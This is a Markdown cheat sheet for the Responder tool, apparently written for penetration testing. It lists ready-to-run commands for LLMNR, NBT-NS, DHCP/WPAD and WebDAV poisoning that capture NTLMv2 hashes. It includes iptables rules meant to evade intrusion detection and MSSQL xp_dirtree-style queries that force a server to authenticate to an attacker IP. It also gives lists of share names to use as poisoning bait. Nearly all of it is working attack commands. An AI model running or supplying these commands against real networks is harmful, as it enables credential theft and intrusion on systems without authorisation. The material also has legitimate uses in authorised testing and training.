# Responder

## 01 - Basics

### 1.1 - LLMNR

- **NBT-NS and LLMNR Poisoning via capturing NTLMv2-SSP hashes**

`$ sudo responder -I <interface> -rdwv`

- **LLMNR Poisoning**

`$ sudo responder -I eth0 --lm -v`

`C:\> net view \\snare`

`C:\> MpCmdRun.exe -Scan -ScanType 3 -File \\snare\share\file.txt`

`PS C:\> Resolve-DnsName -LlmnrOnly Snare 2> $Null`

### 1.2 - DHCP

- **DHCP and WPAD poisoning**

When a windows host requires a new IP address dynamically it can perform HTTP WPAD poisoning response while the user uses a web browser that contains auto proxy settings enabled

`$ sudo responder -I <interface> -Pdwv`

### 1.3 - WebDAV

- **Block SMB traffic on the attacker's machine to poison NTLMv2-SSP responses via WebDAV/HTTP**

Note: You don't have to block the ports unless you're evading some IDS to identify you for performing MITM poisoning

```
$ sudo iptables -A INPUT -p udp --dport 137 -j DROP
$ sudo iptables -A INPUT -p udp --dport 138 -j DROP
$ sudo iptables -A INPUT -p tcp --dport 139 -j DROP
$ sudo iptables -A INPUT -p tcp --dport 445 -j DROP
```

`$ sudo responder -I eth1 -Pdv`

`C:\> certutil -urlcache -split -f https://google.com file.txt`

`PS C:\> Invoke-WebRequest -Uri https://google.com -OutFile file.txt`

## 02 - MSSQL

```
1> xp_dirtree '\\<attacker_IP>\snare\'
2> go

1> EXEC master.dbo.xp_dirtree '\\<attacker_IP>\snare\'
2> go

1> EXEC master..xp_subdirs '\\<attacker_IP>\snare\'
2> go

1> EXEC master..xp_fileexist '\\<attacker_IP>\snare\'
2> go
```

- **Capture hash**

`$ sudo responder -I tun0`

## 03 - Share Names Examples

### 3.1 - Hosts

- Make sure if none of these share names are included in the network when performing active poisoning

```
\\admin
\\administrator
\\cctv
\\client
\\host-01
\\itadmin
\\itdep
\\manager
\\pc-01
\\sysadmin
\\win-desktop
\\workstation-01
\\workstation-02
\\ws1
\\ws2
\\ws01
\\ws02
```

### 3.2 - Servers

- Make sure if none of these share names are included in the network when performing active poisoning

```
\\dc
\\dc01
\\developer
\\fileserver
\\ftp-srv
\\mail
\\mail-srv
\\rdpsrv
\\server
\\sms-sql
\\sql-srv
```

## References

- [Responder](https://github.com/lgandx/Responder)

- [Responders DHCP Poisoner](https://g-laurent.blogspot.com/2021/08/responders-dhcp-poisoner.html)

- [Pentesting MSSQL Microsoft SQL Server](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)

- [Understanding UNC Paths SMB And WebDAV](https://www.n00py.io/2019/06/understanding-unc-paths-smb-and-webdav/)

- [The Dangers of Endpoint Discovery in Vipre Endpoint Security](https://www.n00py.io/2020/12/the-dangers-of-endpoint-discovery-in-vipre-endpoint-security/)

- [Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)

- [Using A SCF File to Gather Hashes](https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/)

- [SMB HTTP Auth Capture va SCF](https://room362.com/post/2016/smb-http-auth-capture-via-scf/)

- [A Detailed Guide on Responder LLMNR Poisoning](https://www.hackingarticles.in/a-detailed-guide-on-responder-llmnr-poisoning/)